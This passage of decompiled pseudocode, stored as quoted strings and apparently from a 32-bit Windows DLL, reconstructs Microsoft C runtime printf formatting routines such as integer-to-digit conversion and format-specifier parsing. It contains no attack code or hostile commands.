    "    if ( !(a3 | a2) )",
    "      break;",
    "    v13 = this[9];",
    "LABEL_7:",
    "    this[9] = v13 - 1;",
    "    v14 = a2 & 7;",
    "    a2 = __PAIR64__(a3, a2) >> 3;",
    "    *v11 = v14 + 48;",
    "    a3 >>= 3;",
    "    v12 = (char *)--this[12];",
    "    v11 = v12;",
    "  }",
    "  result = v12 + 1;",
    "  this[13] = v16 - v12;",
    "  this[12] = v12 + 1;",
    "  return result;",
    "}",
    "",
    "",
    "_WORD *__thiscall sub_1001AA1D(_DWORD *this, unsigned int a2, unsigned int a3, int a4)",
    "{",
    "  _DWORD *v5; // ecx",
    "  _DWORD *v6; // esi",
    "  int v7; // eax",
    "  _WORD *v10; // ecx",
    "  _WORD *v11; // esi",
    "  int v12; // eax",
    "  _WORD *result; // eax",
    "  _WORD *v14; // [esp+14h] [ebp-8h]",
    "  char v15; // [esp+18h] [ebp-4h]",
    "",
    "  v5 = this + 15;",
    "  v6 = (_DWORD *)v5[257];",
    "  if ( !v6 )",
    "    v6 = v5;",
    "  v7 = __crt_stdio_output::formatting_buffer::count<wchar_t>(v5);",
    "  v10 = (_WORD *)v6 + v7 - 1;",
    "  v14 = v10;",
    "  v11 = v10;",
    "  this[12] = v10;",
    "  while ( 1 )",
    "  {",
    "    v12 = this[9];",
    "    v15 = a2;",
    "    if ( v12 > 0 )",
    "      goto LABEL_7;",
    "    if ( !(a3 | a2) )",
    "      break;",
    "    v12 = this[9];",
    "LABEL_7:",
    "    this[9] = v12 - 1;",
    "    a2 = __PAIR64__(a3, a2) >> 3;",
    "    *v10 = (v15 & 7) + 48;",
    "    a3 >>= 3;",
    "    this[12] -= 2;",
    "    v11 = (_WORD *)this[12];",
    "    v10 = v11;",
    "  }",
    "  result = v11 + 1;",
    "  this[13] = v14 - v11;",
    "  this[12] = v11 + 1;",
    "  return result;",
    "}",
    "",
    "",
    "_BYTE *__thiscall sub_1001AA9D(_DWORD *this, unsigned __int64 a2, char a3)",
    "{",
    "  _DWORD *v4; // ecx",
    "  _DWORD *v5; // esi",
    "  char *v6; // ecx",
    "  int v8; // edx",
    "  char v9; // cl",
    "  _BYTE *result; // eax",
    "  int v11; // [esp+14h] [ebp-8h]",
    "  char *i; // [esp+18h] [ebp-4h]",
    "",
    "  v4 = this + 15;",
    "  v5 = (_DWORD *)v4[257];",
    "  if ( !v5 )",
    "    v5 = v4;",
    "  v11 = (int)v5 + __crt_stdio_output::formatting_buffer::count<char>(v4) - 1;",
    "  v6 = (char *)v11;",
    "  this[12] = v11;",
    "  for ( i = (char *)v11; ; i = v6 )",
    "  {",
    "    v8 = this[9];",
    "    if ( v8 <= 0 && !a2 )",
    "      break;",
    "    this[9] = v8 - 1;",
    "    v9 = a2 % 0xA + 48;",
    "    a2 /= 0xAu;",
    "    if ( v9 > 57 )",
    "      v9 += 32 * (a3 ^ 1) + 7;",
    "    *i = v9;",
    "    v6 = (char *)--this[12];",
    "  }",
    "  result = v6 + 1;",
    "  this[13] = v11 - (_DWORD)v6;",
    "  this[12] = v6 + 1;",
    "  return result;",
    "}",
    "",
    "",
    "_WORD *__thiscall sub_1001AB2F(_DWORD *this, unsigned int a2, unsigned int a3, char a4)",
    "{",
    "  _DWORD *v5; // ecx",
    "  _DWORD *v6; // esi",
    "  _WORD *v8; // ecx",
    "  int v10; // edx",
    "  unsigned __int64 v11; // rcx",
    "  unsigned int v12; // ecx",
    "  _WORD *result; // eax",
    "  unsigned __int64 v14; // [esp-14h] [ebp-30h]",
    "  int v15; // [esp+14h] [ebp-8h]",
    "  _WORD *i; // [esp+18h] [ebp-4h]",
    "",
    "  v5 = this + 15;",
    "  v6 = (_DWORD *)v5[257];",
    "  if ( !v6 )",
    "    v6 = v5;",
    "  v15 = (int)v6 + 2 * __crt_stdio_output::formatting_buffer::count<wchar_t>(v5) - 2;",
    "  v8 = (_WORD *)v15;",
    "  this[12] = v15;",
    "  for ( i = (_WORD *)v15; ; i = v8 )",
    "  {",
    "    v10 = this[9];",
    "    if ( v10 <= 0 && !(a3 | a2) )",
    "      break;",
    "    v14 = __PAIR64__(a3, a2);",
    "    this[9] = v10 - 1;",
    "    v11 = __PAIR64__(a3, a2) % 0xA;",
    "    a2 = v14 / 0xA;",
    "    v12 = (unsigned __int16)(v11 + 48);",
    "    a3 = (v14 / 0xA) >> 32;",
    "    if ( v12 > 0x39 )",
    "      LOBYTE(v12) = v12 + 32 * (a4 ^ 1) + 7;",
    "    *i = (char)v12;",
    "    this[12] -= 2;",
    "    v8 = (_WORD *)this[12];",
    "  }",
    "  result = v8 + 1;",
    "  this[13] = (v15 - (int)v8) >> 1;",
    "  this[12] = v8 + 1;",
    "  return result;",
    "}",
    "",
    "",
    "_BYTE *__thiscall sub_1001ABD4(_DWORD *this, unsigned int a2, unsigned int a3, char a4)",
    "{",
    "  _DWORD *v5; // ecx",
    "  _DWORD *v6; // esi",
    "  int v7; // eax",
    "  char *v9; // ecx",
    "  char *v11; // ecx",
    "  char *v12; // edx",
    "  int v13; // eax",
    "  char v14; // al",
    "  unsigned __int8 v15; // al",
    "  _BYTE *result; // eax",
    "  char *v17; // [esp+Ch] [ebp-8h]",
    "",
    "  v5 = this + 15;",
    "  v6 = (_DWORD *)v5[257];",
    "  if ( !v6 )",
    "    v6 = v5;",
    "  v7 = __crt_stdio_output::formatting_buffer::count<char>(v5);",
    "  v9 = (char *)v6 - 1;",
    "  v11 = &v9[v7];",
    "  v17 = v11;",
    "  v12 = v11;",
    "  this[12] = v11;",
    "  while ( 1 )",
    "  {",
    "    v13 = this[9];",
    "    if ( v13 > 0 )",
    "      goto LABEL_7;",
    "    if ( !(a3 | a2) )",
    "      break;",
    "    v13 = this[9];",
    "LABEL_7:",
    "    this[9] = v13 - 1;",
    "    v14 = a2 & 0xF;",
    "    a2 = __PAIR64__(a3, a2) >> 4;",
    "    v15 = v14 + 48;",
    "    a3 >>= 4;",
    "    if ( v15 > 0x39u )",
    "      v15 += 32 * (a4 ^ 1) + 7;",
    "    *v11 = v15;",
    "    v12 = (char *)--this[12];",
    "    v11 = v12;",
    "  }",
    "  result = v12 + 1;",
    "  this[13] = v17 - v12;",
    "  this[12] = v12 + 1;",
    "  return result;",
    "}",
    "",
    "",
    "_WORD *__thiscall sub_1001AC5A(_DWORD *this, unsigned int a2, unsigned int a3, char a4)",
    "{",
    "  _DWORD *v5; // ecx",
    "  _DWORD *v6; // esi",
    "  int v7; // eax",
    "  char *v9; // ecx",
    "  char *v11; // ecx",
    "  char *v12; // edx",
    "  int v13; // eax",
    "  unsigned __int16 v14; // ax",
    "  unsigned __int16 v15; // dx",
    "  _WORD *result; // eax",
    "  char *v17; // [esp+Ch] [ebp-8h]",
    "",
    "  v5 = this + 15;",
    "  v6 = (_DWORD *)v5[257];",
    "  if ( !v6 )",
    "    v6 = v5;",
    "  v7 = __crt_stdio_output::formatting_buffer::count<wchar_t>(v5);",
    "  v9 = (char *)v6 - 2;",
    "  v11 = &v9[2 * v7];",
    "  v17 = v11;",
    "  v12 = v11;",
    "  this[12] = v11;",
    "  while ( 1 )",
    "  {",
    "    v13 = this[9];",
    "    if ( v13 > 0 )",
    "      goto LABEL_7;",
    "    if ( !(a3 | a2) )",
    "      break;",
    "    v13 = this[9];",
    "LABEL_7:",
    "    this[9] = v13 - 1;",
    "    v14 = (a2 & 0xF) + 48;",
    "    a2 = __PAIR64__(a3, a2) >> 4;",
    "    v15 = v14;",
    "    a3 >>= 4;",
    "    if ( v14 > 0x39u )",
    "      v15 = (unsigned __int8)(v14 + 32 * (a4 ^ 1) + 7);",
    "    *(_WORD *)v11 = v15;",
    "    this[12] -= 2;",
    "    v12 = (char *)this[12];",
    "    v11 = v12;",
    "  }",
    "  result = v12 + 2;",
    "  this[13] = (v17 - v12) >> 1;",
    "  this[12] = v12 + 2;",
    "  return result;",
    "}",
    "",
    "",
    "// Microsoft VisualC universal runtime",
    "_DWORD *__thiscall unknown_libname_9(_DWORD *this, _DWORD *a2, int a3, int a4, int a5, int a6, int a7)",
    "{",
    "}// Microsoft VisualC universal runtime",
    "_DWORD *__thiscall unknown_libname_10(_DWORD *this, _DWORD *a2, int a3, int a4, int a5, int a6, int a7)",
    "{",
    "}void __thiscall __crt_stdio_output::formatting_buffer::~formatting_buffer(void **this)",
    "{",
    "  _free_base(this[257]);",
    "  this[257] = 0;",
    "}",
    "",
    "",
    "// Microsoft VisualC universal runtime",
    "void **__thiscall unknown_libname_11(void **this, void **a2)",
    "{",
    "}char __cdecl sub_1001ADFD(char *a1, int a2)",
    "{",
    "  char v2; // bl",
    "  char *v3; // eax",
    "  char v4; // cl",
    "  char v5; // dl",
    "  _BYTE *v6; // eax",
    "  char v7; // cl",
    "  _BYTE *v8; // esi",
    "  _BYTE *v9; // ecx",
    "  int v10; // esi",
    "",
    "  v2 = ***(_BYTE ***)(*(_DWORD *)a2 + 136);",
    "  v3 = a1;",
    "  v4 = *a1;",
    "  if ( *a1 )",
    "  {",
    "    v5 = *a1;",
    "    do",
    "    {",
    "      v4 = v5;",
    "      if ( v5 == v2 )",
    "        break;",
    "      v4 = *++v3;",
    "      v5 = *v3;",
    "    }",
    "    while ( *v3 );",
    "  }",
    "  v6 = v3 + 1;",
    "  if ( v4 )",
    "  {",
    "    while ( 1 )",
    "    {",
    "      v7 = *v6;",
    "      if ( !*v6 || v7 == 101 || v7 == 69 )",
    "        break;",
    "      ++v6;",
    "    }",
    "    v8 = v6;",
    "    do",
    "      --v6;",
    "    while ( *v6 == 48 );",
    "    v9 = v6 - 1;",
    "    if ( *v6 != v2 )",
    "      v9 = v6;",
    "    v10 = v8 - v9;",
    "    do",
    "    {",
    "      LOBYTE(v6) = (v9++)[v10];",
    "      *v9 = (_BYTE)v6;",
    "    }",
    "    while ( (_BYTE)v6 );",
    "  }",
    "  return (char)v6;",
    "}",
    "",
    "",
    "// Microsoft VisualC universal runtime",
    "char __stdcall unknown_libname_12(char a1, char a2)",
    "{",
    "}// Microsoft VisualC universal runtime",
    "char __stdcall unknown_libname_13(__int16 a1, char a2)",
    "{",
    "}unsigned __int8 __cdecl sub_1001AEDC(unsigned __int8 *a1, int *a2)",
    "{",
    "  unsigned __int8 *v2; // esi",
    "  int v3; // edi",
    "  unsigned __int8 v4; // dl",
    "  int v5; // ecx",
    "  bool v6; // zf",
    "  _BYTE *v7; // ecx",
    "  unsigned __int8 *v8; // esi",
    "  unsigned __int8 result; // al",
    "  unsigned __int8 v10; // cl",
    "",
    "  v2 = a1;",
    "  v3 = *a2;",
    "  v4 = *a1;",
    "  v5 = *(_DWORD *)(*a2 + 148);",
    "  if ( *(_BYTE *)(*a1 + v5) != 101 )",
    "  {",
    "    do",
    "      v4 = *++v2;",
    "    while ( (*(_BYTE *)(*(_DWORD *)v3 + 2 * *v2) & 4) != 0 );",
    "  }",
    "  v6 = *(_BYTE *)(v4 + v5) == 120;",
    "  if ( *(_BYTE *)(v4 + v5) == 120 )",
    "    v4 = v2[2];",
    "  v7 = v2 + 2;",
    "  if ( !v6 )",
    "    v7 = v2;",
    "  v8 = v7 + 1;",
    "  *v7 = ***(_BYTE ***)(v3 + 136);",
    "  do",
    "  {",
    "    result = *v8;",
    "    v10 = v4;",
    "    *v8++ = v4;",
    "    v4 = result;",
    "  }",
    "  while ( v10 );",
    "  return result;",
    "}",
    "",
    "",
    "// Microsoft VisualC universal runtime",
    "char __thiscall unknown_libname_14(_DWORD *this, int *a2)",
    "{",
    "}// Microsoft VisualC universal runtime",
    "char __thiscall unknown_libname_15(_DWORD *this, int *a2)",
    "{",
    "}int __thiscall __crt_stdio_output::output_processor<char,__crt_stdio_output::string_output_adapter<char>,__crt_stdio_output::standard_base<char,__crt_stdio_output::string_output_adapter<char>>>::process(",
    "        int this)",
    "{",
    "  char *v2; // ecx",
    "  int v3; // eax",
    "  int v5; // eax",
    "  char v6; // dl",
    "  char v7; // al",
    "  int v8; // edi",
    "  int ctype_array_value; // eax",
    "  int *v10; // edi",
    "  _DWORD *v11; // ecx",
    "  char *v12; // eax",
    "  char v13; // cl",
    "  int v14; // eax",
    "  int v15; // eax",
    "  int v16; // edx",
    "  int *v17; // eax",
    "  char v18; // al",
    "  int *v19; // ecx",
    "  int v20; // eax",
    "  int *v21; // ecx",
    "  int v22; // eax",
    "  char *v23; // eax",
    "  char v24; // dl",
    "  int v25; // ecx",
    "  int v26; // [esp+0h] [ebp-14h]",
    "  int v27; // [esp+4h] [ebp-10h]",
    "  char v28; // [esp+Fh] [ebp-5h]",
    "  char v29; // [esp+13h] [ebp-1h]",
    "  char v30; // [esp+13h] [ebp-1h]",
    "",
    "  if ( !(unsigned __int8)unknown_libname_18(*(__crt_cached_ptd_host **)(this + 8)) )",
    "    return -1;",
    "  v2 = *(char **)(this + 12);",
    "  if ( !v2 )",
    "  {",
    "    v3 = *(_DWORD *)(this + 8);",
    "    *(_BYTE *)(v3 + 28) = 1;",
    "    *(_DWORD *)(v3 + 24) = 22;",
    "    goto LABEL_4;",
    "  }",
    "  v5 = *(_DWORD *)(this + 1104) + 1;",
    "  *(_DWORD *)(this + 1104) = v5;",
    "  if ( v5 != 2 )",
    "  {",
    "    while ( 1 )",
    "    {",
    "      *(_DWORD *)(this + 52) = 0;",
    "      *(_BYTE *)(this + 24) = 0;",
    "      v6 = *v2++;",
    "      v29 = v6;",
    "      *(_DWORD *)(this + 12) = v2;",
    "      *(_BYTE *)(this + 45) = v6;",
    "      if ( v6 )",
    "        break;",
    "LABEL_54:",
    "      if ( ++*(_DWORD *)(this + 1104) == 2 )",
    "        return *(_DWORD *)(this + 20);",
    "    }",
    "    v28 = v6;",
    "    while ( 1 )",
    "    {",
    "      if ( *(int *)(this + 20) < 0 )",
    "        goto LABEL_54;",
    "      v7 = unknown_libname_12(v28, *(_BYTE *)(this + 24));",
    "      *(_BYTE *)(this + 24) = v7;",
    "      if ( (unsigned __int8)v7 >= 8u )",
    "        break;",
    "      switch ( v7 )",
    "      {",
    "        case 0:",
    "          v8 = *(_DWORD *)(this + 8);",
    "          *(_BYTE *)(this + 56) = 0;",
    "          if ( !*(_BYTE *)(v8 + 20) )",
    "            __crt_cached_ptd_host::update_locale_slow((__crt_cached_ptd_host *)v8);",
    "          v30 = *(_BYTE *)(this + 45);",
    "          ctype_array_value = __acrt_locale_get_ctype_array_value(",
    "                                **(const unsigned __int16 *const **)(v8 + 12),",
    "                                v30,",
    "                                0x8000);",
    "          v10 = (int *)(this + 1096);",
    "          if ( ctype_array_value )",
    "          {",
    "            v11 = (_DWORD *)*v10;",
    "            if ( *(_DWORD *)(*v10 + 8) == *(_DWORD *)(*v10 + 4) )",
    "            {",
    "              if ( *((_BYTE *)v11 + 12) )",
    "                ++*(_DWORD *)(this + 20);",
    "              else",
    "                *(_DWORD *)(this + 20) = -1;",
    "            }",
    "            else",
    "            {",
    "              ++*(_DWORD *)(this + 20);",
    "              ++v11[2];",
    "              *(_BYTE *)(*(_DWORD *)*v10)++ = v30;",
    "            }",
    "            v12 = *(char **)(this + 12);",
    "            v13 = *v12;",
    "            *(_DWORD *)(this + 12) = v12 + 1;",
    "            *(_BYTE *)(this + 45) = v13;",
    "            if ( !v13 )",
    "            {",
    "              v14 = *(_DWORD *)(this + 8);",
    "              *(_BYTE *)(v14 + 28) = 1;",
    "              *(_DWORD *)(v14 + 24) = 22;",
    "              _invalid_parameter_internal(0, 0, 0, 0, 0, *(struct __acrt_ptd ***)(this + 8));",
    "              v15 = *(_DWORD *)(this + 8);",
    "              *(_BYTE *)(v15 + 28) = 1;",
    "              *(_DWORD *)(v15 + 24) = 22;",
    "              _invalid_parameter_internal(0, 0, 0, 0, 0, *(struct __acrt_ptd ***)(this + 8));",
    "              return -1;",
    "            }",
    "          }",
    "          else",
    "          {",
    "            v13 = v30;",
    "          }",
    "          v16 = *v10;",
    "          if ( *(_DWORD *)(*v10 + 8) == *(_DWORD *)(*v10 + 4) )",
    "          {",
    "            if ( *(_BYTE *)(v16 + 12) )",
    "              ++*(_DWORD *)(this + 20);",
    "            else",
    "              *(_DWORD *)(this + 20) = -1;",
    "          }",
    "          else",
    "          {",
    "            ++*(_DWORD *)(this + 20);",
    "            ++*(_DWORD *)(v16 + 8);",
    "            *(_BYTE *)(*(_DWORD *)*v10)++ = v13;",
    "          }",
    "LABEL_53:",
    "          v23 = *(char **)(this + 12);",
    "          v24 = *v23;",
    "          v2 = v23 + 1;",
    "          *(_DWORD *)(this + 12) = v23 + 1;",
    "          v29 = v24;",
    "          *(_BYTE *)(this + 45) = v24;",
    "          v28 = v24;",
    "          if ( !v24 )",
    "            goto LABEL_54;",
    "          break;",
    "        case 1:",
    "          *(_DWORD *)(this + 36) = -1;",
    "          *(_DWORD *)(this + 32) = 0;",
    "          *(_BYTE *)(this + 44) = 0;",
    "          *(_DWORD *)(this + 28) = 0;",
    "          *(_DWORD *)(this + 40) = 0;",
    "          *(_BYTE *)(this + 56) = 0;",
    "          goto LABEL_53;",
    "        case 2:",
    "          switch ( v29 )",
    "          {",
    "            case ' ':",
    "              *(_DWORD *)(this + 28) |= 2u;",
    "              break;",
    "            case '#':",
    "              *(_DWORD *)(this + 28) |= 0x20u;",
    "              break;",
    "            case '+':",
    "              *(_DWORD *)(this + 28) |= 1u;",
    "              break;",
    "            case '-':",
    "              *(_DWORD *)(this + 28) |= 4u;",
    "              break;",
    "            case '0':",
    "              *(_DWORD *)(this + 28) |= 8u;",
    "              break;",
    "          }",
    "          goto LABEL_53;",
    "        case 3:",
    "          if ( v29 != 42 )",
    "          {",
    "            v17 = (int *)(this + 32);",
    "            goto LABEL_41;",
    "          }",
    "          v19 = *(int **)(this + 16);",
    "          *(_DWORD *)(this + 16) = v19 + 1;",
    "          v20 = *v19;",
    "          *(_DWORD *)(this + 32) = *v19;",
    "          if ( v20 < 0 )",
    "          {",
    "            *(_DWORD *)(this + 28) |= 4u;",
    "            *(_DWORD *)(this + 32) = -v20;",
    "          }",
    "          goto LABEL_44;",
    "        case 4:",
    "          *(_DWORD *)(this + 36) = 0;",
    "          goto LABEL_53;",
    "        case 5:",
    "          if ( v29 == 42 )",
    "          {",
    "            v21 = *(int **)(this + 16);",
    "            *(_DWORD *)(this + 16) = v21 + 1;",
    "            v22 = *v21;",
    "            *(_DWORD *)(this + 36) = *v21;",
    "            if ( v22 < 0 )",
    "              *(_DWORD *)(this + 36) = -1;",
    "LABEL_44:",
    "            v18 = 1;",
    "          }",
    "          else",
    "          {",
    "            v17 = (int *)(this + 36);",
    "LABEL_41:",
    "            v18 = unknown_libname_14((_DWORD *)this, v17);",
    "          }",
    "LABEL_52:",
    "          if ( v18 )",
    "            goto LABEL_53;",
    "          return -1;",
    "        case 6:",
    "          v18 = sub_1001B540(this);",
    "          goto LABEL_52;",
    "        case 7:",
    "          v18 = sub_1001B823(v26, v27);",
    "          goto LABEL_52;",
    "        default:",
    "          return -1;",
    "      }",
    "    }",
    "    v25 = *(_DWORD *)(this + 8);",
    "    *(_BYTE *)(v25 + 28) = 1;",
    "    *(_DWORD *)(v25 + 24) = 22;",
    "LABEL_4:",
    "    _invalid_parameter_internal(0, 0, 0, 0, 0, *(struct __acrt_ptd ***)(this + 8));",
    "    return -1;",
    "  }",
    "  return *(_DWORD *)(this + 20);",
    "}",
    "",
    "",
    "int __thiscall __crt_stdio_output::output_processor<wchar_t,__crt_stdio_output::string_output_adapter<wchar_t>,__crt_stdio_output::standard_base<wchar_t,__crt_stdio_output::string_output_adapter<wchar_t>>>::process(",
    "        int this)",
    "{",
    "  __int16 *v2; // edx",
    "  int v3; // eax",
    "  int v5; // eax",
    "  __int16 v6; // ax",
    "  __int16 v7; // di",
    "  int *v8; // eax",
    "  char v9; // al",
    "  int v10; // ecx",
    "  int v11; // eax",
    "  int *v12; // eax",
    "  char v13; // al",
    "  int *v14; // ecx",
    "  int v15; // eax",
    "  int *v16; // ecx",
    "  int v17; // eax",
    "  __int16 *v18; // eax",
    "  __int16 v19; // cx",
    "  int v20; // ecx",
    "",
    "  if ( !(unsigned __int8)unknown_libname_18(*(__crt_cached_ptd_host **)(this + 8)) )",
    "    return -1;",
    "  v2 = *(__int16 **)(this + 12);",
    "  if ( !v2 )",
    "  {",
    "    v3 = *(_DWORD *)(this + 8);",
    "    *(_BYTE *)(v3 + 28) = 1;",
    "    *(_DWORD *)(v3 + 24) = 22;",
    "LABEL_4:",
    "    _invalid_parameter_internal(0, 0, 0, 0, 0, *(struct __acrt_ptd ***)(this + 8));",
    "    return -1;",
    "  }",
    "  v5 = *(_DWORD *)(this + 1104) + 1;",
    "  *(_DWORD *)(this + 1104) = v5;",
    "  if ( v5 != 2 )",
    "  {",
    "    while ( 1 )",
    "    {",
    "      *(_DWORD *)(this + 52) = 0;",
    "      *(_BYTE *)(this + 24) = 0;",
    "      v6 = *v2++;",
    "      *(_DWORD *)(this + 12) = v2;",
    "      *(_WORD *)(this + 46) = v6;",
    "      if ( v6 )",
    "      {",
    "        v7 = v6;",
    "        v8 = (int *)(this + 20);",
    "LABEL_9:",
    "        if ( *v8 >= 0 )",
    "          break;",
    "      }",
    "LABEL_44:",
    "      if ( ++*(_DWORD *)(this + 1104) == 2 )",
    "        return *(_DWORD *)(this + 20);",
    "    }",
    "    v9 = unknown_libname_13(v7, *(_BYTE *)(this + 24));",
    "    *(_BYTE *)(this + 24) = v9;",
    "    if ( (unsigned __int8)v9 < 8u )",
    "    {",
    "      switch ( v9 )",
    "      {",
    "        case 0:",
    "          *(_BYTE *)(this + 56) = 1;",
    "          v10 = *(_DWORD *)(this + 1096);",
    "          if ( *(_DWORD *)(v10 + 8) == *(_DWORD *)(v10 + 4) )",
    "          {",
    "            if ( *(_BYTE *)(v10 + 12) )",
    "              v11 = *(_DWORD *)(this + 20) + 1;",
    "            else",
    "              v11 = -1;",
    "            *(_DWORD *)(this + 20) = v11;",
    "          }",
    "          else",
    "          {",
    "            ++*(_DWORD *)(this + 20);",
    "            ++*(_DWORD *)(v10 + 8);",
    "            ***(_WORD ***)(this + 1096) = v7;",
    "            **(_DWORD **)(this + 1096) += 2;",
    "          }",
    "          goto LABEL_43;",
    "        case 1:",
    "          *(_DWORD *)(this + 36) = -1;",
    "          *(_DWORD *)(this + 32) = 0;",
    "          *(_BYTE *)(this + 44) = 0;",
    "          *(_DWORD *)(this + 28) = 0;",
    "          *(_DWORD *)(this + 40) = 0;",
    "          *(_BYTE *)(this + 56) = 0;",
    "          goto LABEL_43;",
    "        case 2:",
    "          switch ( v7 )",
    "          {",
    "            case ' ':",
    "              *(_DWORD *)(this + 28) |= 2u;",
    "              break;",
    "            case '#':",
    "              *(_DWORD *)(this + 28) |= 0x20u;",
    "              break;",
    "            case '+':",
    "              *(_DWORD *)(this + 28) |= 1u;",
    "              break;",
    "            case '-':",
    "              *(_DWORD *)(this + 28) |= 4u;",
    "              break;",
    "            case '0':",
    "              *(_DWORD *)(this + 28) |= 8u;",
    "              break;",
    "          }",
    "          goto LABEL_43;",
    "        case 3:",
    "          if ( v7 != 42 )",
    "          {",
    "            v12 = (int *)(this + 32);",
    "            goto LABEL_31;",
    "          }",
    "          v14 = *(int **)(this + 16);",
    "          *(_DWORD *)(this + 16) = v14 + 1;",
    "          v15 = *v14;",
    "          *(_DWORD *)(this + 32) = *v14;",
    "          if ( v15 < 0 )",
    "          {",
    "            *(_DWORD *)(this + 28) |= 4u;",
    "            *(_DWORD *)(this + 32) = -v15;",
    "          }",
    "          goto LABEL_34;",
    "        case 4:",
    "          *(_DWORD *)(this + 36) = 0;",
    "          goto LABEL_43;",
    "        case 5:",
    "          if ( v7 == 42 )",
    "          {",
    "            v16 = *(int **)(this + 16);",
    "            *(_DWORD *)(this + 16) = v16 + 1;",
    "            v17 = *v16;",
    "            *(_DWORD *)(this + 36) = *v16;",
    "            if ( v17 < 0 )",
    "              *(_DWORD *)(this + 36) = -1;",
    "LABEL_34:",
    "            v13 = 1;",
    "          }",
    "          else",
    "          {",
    "            v12 = (int *)(this + 36);",
    "LABEL_31:",
    "            v13 = unknown_libname_15((_DWORD *)this, v12);",
    "          }",
    "LABEL_42:",
    "          if ( !v13 )",
    "            return -1;",
    "LABEL_43:",
    "          v18 = *(__int16 **)(this + 12);",
    "          v19 = *v18;",
    "          v2 = v18 + 1;",
    "          *(_DWORD *)(this + 12) = v18 + 1;",
    "          v7 = v19;",
    "          *(_WORD *)(this + 46) = v19;",
    "          v8 = (int *)(this + 20);",
    "          if ( !v19 )",
    "            goto LABEL_44;",
    "          goto LABEL_9;",
    "        case 6:",
    "          v13 = sub_1001B699(this);",
    "          goto LABEL_42;",
    "        case 7:",
    "          v13 = sub_1001BC62(this);",
    "          goto LABEL_42;",
    "        default:",
    "          return -1;",
    "      }",
    "    }",
    "    v20 = *(_DWORD *)(this + 8);",
    "    *(_BYTE *)(v20 + 28) = 1;",
    "    *(_DWORD *)(v20 + 24) = 22;",
    "    goto LABEL_4;",
    "  }",
    "  return *(_DWORD *)(this + 20);",
    "}",
    "",
    "",
    "char __cdecl sub_1001B540(int a1, int a2)",
    "{",
    "  int v2; // ecx",
    "  char v3; // al",
    "  int v5; // eax",
    "  _BYTE *v6; // eax",
    "  int v7; // eax",
    "  char *v8; // esi",
    "  char v9; // al",
    "  _BYTE *v10; // eax",
    "  int v11; // [esp-4h] [ebp-4h]",
    "",
    "  v3 = *(_BYTE *)(v2 + 45);",
    "  if ( v3 == 70 )",
    "  {",
    "    if ( (*(_DWORD *)v2 & 8) == 0 )",
    "    {",
    "      *(_BYTE *)(v2 + 24) = 7;",
    "      return sub_1001B823(a1, a2);",
    "    }",
    "    return 1;",
    "  }",
    "  if ( v3 == 78 )",
    "  {",
    "    if ( (*(_DWORD *)v2 & 8) == 0 )",
    "    {",
    "      *(_BYTE *)(v2 + 24) = 8;",
    "LABEL_7:",
    "      v5 = *(_DWORD *)(v2 + 8) + 24;",
    "      *(_BYTE *)(v5 + 4) = 1;",
    "      *(_DWORD *)v5 = 22;",
    "      _invalid_parameter_internal(0, 0, 0, 0, 0, *(struct __acrt_ptd ***)(v2 + 8));",
    "      return 0;",
    "    }",
    "    return 1;",
    "  }",
    "  if ( *(_DWORD *)(v2 + 40) )",
    "    goto LABEL_7;",
    "  if ( v3 > 106 )",
    "  {",
    "    if ( v3 != 108 )",
    "    {",
    "      switch ( v3 )",
    "      {",
    "        case 't':",
    "          *(_DWORD *)(v2 + 40) = 7;",
    "          break;",
    "        case 'w':",
    "          *(_DWORD *)(v2 + 40) = 12;",
    "          break;",
    "        case 'z':",
    "          *(_DWORD *)(v2 + 40) = 6;",
    "          break;",
    "      }",
    "      return 1;",
    "    }",
    "    v10 = *(_BYTE **)(v2 + 12);",
    "    if ( *v10 == 108 )",
    "    {",
    "      *(_DWORD *)(v2 + 12) = v10 + 1;",
    "      v11 = 4;",
    "    }",
    "    else",
    "    {",
    "      v11 = 3;",
    "    }",
    "    goto LABEL_45;",
    "  }",
    "  switch ( v3 )",
    "  {",
    "    case 'j':",
    "      *(_DWORD *)(v2 + 40) = 5;",
    "      return 1;",
    "    case 'I':",
    "      v8 = *(char **)(v2 + 12);",
    "      v9 = *v8;",
    "      if ( *v8 == 51 && v8[1] == 50 )",
    "      {",
    "        *(_DWORD *)(v2 + 40) = 10;",
    "        *(_DWORD *)(v2 + 12) = v8 + 2;",
    "      }",
    "      else if ( v9 == 54 )",
    "      {",
    "        if ( v8[1] == 52 )",
    "        {",
    "          *(_DWORD *)(v2 + 40) = 11;",
    "          *(_DWORD *)(v2 + 12) = v8 + 2;",
    "        }",
    "      }",
    "      else if ( v9 == 100 || v9 == 105 || v9 == 111 || v9 == 117 || v9 == 120 || v9 == 88 )",
    "      {",
    "        *(_DWORD *)(v2 + 40) = 9;",
    "      }",
    "      return 1;",
    "    case 'L':",
    "      *(_DWORD *)(v2 + 40) = 8;",
    "      return 1;",
    "    case 'T':",
    "      *(_DWORD *)(v2 + 40) = 13;",
    "      return 1;",
    "    case 'h':",
    "      v6 = *(_BYTE **)(v2 + 12);",
    "      if ( *v6 == 104 )",
    "      {",
    "        *(_DWORD *)(v2 + 12) = v6 + 1;",
    "        v7 = 1;",
    "LABEL_46:",
    "        *(_DWORD *)(v2 + 40) = v7;",
    "        return 1;",
    "      }",
    "      v11 = 2;",
    "LABEL_45:",
    "      v7 = v11;",
    "      goto LABEL_46;",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "char __thiscall sub_1001B699(unsigned __int16 *this)",
    "{",
    "  int v1; // esi",
    "  int v3; // eax",
    "  _WORD *v4; // eax",
    "  int v5; // eax",
    "  unsigned __int16 *v6; // esi",
    "  int v7; // eax",
    "  _WORD *v8; // eax",
    "  int v9; // [esp-4h] [ebp-8h]",
    "",
    "  v1 = this[23];",
    "  if ( v1 == 70 )",
    "  {",
    "    if ( (*(_DWORD *)this & 8) == 0 )",
    "    {",
    "      *((_BYTE *)this + 24) = 7;",
    "      return sub_1001BC62(this);",
    "    }",
    "    return 1;",
    "  }",
    "  if ( v1 == 78 )",
    "  {",
    "    if ( (*(_DWORD *)this & 8) == 0 )",
    "    {",
    "      *((_BYTE *)this + 24) = 8;",
    "LABEL_7:",
    "      v3 = *((_DWORD *)this + 2) + 24;",
    "      *(_BYTE *)(v3 + 4) = 1;",
    "      *(_DWORD *)v3 = 22;",
    "      _invalid_parameter_internal(0, 0, 0, 0, 0, *((struct __acrt_ptd ***)this + 2));",
    "      return 0;",
    "    }",
    "    return 1;",
    "  }",
    "  if ( *((_DWORD *)this + 10) )",
    "    goto LABEL_7;",
    "  if ( (unsigned __int16)v1 > 0x6Au )",
    "  {",
    "    if ( (_WORD)v1 != 108 )",
    "    {",
    "      switch ( v1 )",
    "      {",
    "        case 't':",
